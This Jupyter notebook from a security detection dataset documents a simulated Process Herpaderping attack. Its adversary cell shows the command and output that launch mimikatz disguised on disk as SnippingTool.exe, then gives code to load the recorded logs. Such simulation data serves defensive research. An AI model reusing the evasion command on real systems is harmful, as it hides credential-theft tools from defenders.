{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "603e89eb",
   "metadata": {},
   "source": [
    "# Process Herpaderping Mimikatz"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ac94eae3",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "285aa504",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/26 |\n",
    "| Modification Date | 2020/10/26 |\n",
    "| Tactics           | [TA0004](https://attack.mitre.org/tactics/TA0004),[TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1055](https://attack.mitre.org/techniques/T1055) |\n",
    "| Tags              | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "259b559f",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents the execution of a Process Herpaderping to obscure the intentions of a process by modifying the content on disk after the image has been mapped."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1f25e9c1",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "63520574",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_process_herpaderping_snippingtool.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_process_herpaderping_snippingtool.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9cae7567",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3eed704a",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "93f70160",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | Cmd | [Cmd](https://github.com/jxy-s/herpaderping) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "61b9863c",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "C:\\Users\\wardog>cd Desktop\n",
    "\n",
    "C:\\Users\\wardog\\Desktop>ProcessHerpaderping.exe mimikatz.exe wardog.exe C:\\Windows\\system32\\SnippingTool.exe\n",
    "Process Herpaderping Tool - Copyright (c) 2020 Johnny Shaw\n",
    "[12140:10252][OK]    Source File: \"mimikatz.exe\"\n",
    "[12140:10252][OK]    Target File: \"wardog.exe\"\n",
    "[12140:10252][INFO]  Copied source binary to target file\n",
    "[12140:10252][INFO]  Created image section for target\n",
    "[12140:10252][INFO]  Created process object, PID 8924\n",
    "[12140:10252][INFO]  Located target image entry RVA 0x000c3aec\n",
    "[12140:10252][OK]    Replacing target with \"C:\\Windows\\system32\\SnippingTool.exe\"\n",
    "[12140:10252][OK]    Preparing target for execution\n",
    "[12140:10252][INFO]  Writing process parameters, remote PEB ProcessParameters 0x0000000000AED020\n",
    "[12140:10252][INFO]  Creating thread in process at entry point 0x00007FF733E63AEC\n",
    "[12140:10252][INFO]  Created thread, TID 12112\n",
    "[12140:10252][OK]    Waiting for herpaderped process to exit\n",
    "[12140:10252][OK]    Herpaderped process exited with code 0xc000013a\n",
    "[12140:10252][OK]    Process Herpaderp Succeeded\n",
    "\n",
    "C:\\Users\\wardog\\Desktop>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "75e0fb39",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "644f8a86",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3bb9ea75",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_process_herpaderping_snippingtool.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7d12054e",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b08ab78e",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5326c8c9",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e070f9eb",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c6cec2e1",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/jxy-s/herpaderping](https://github.com/jxy-s/herpaderping) \n",
    "* [https://twitter.com/jxy__s/status/1320853852153769984](https://twitter.com/jxy__s/status/1320853852153769984) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
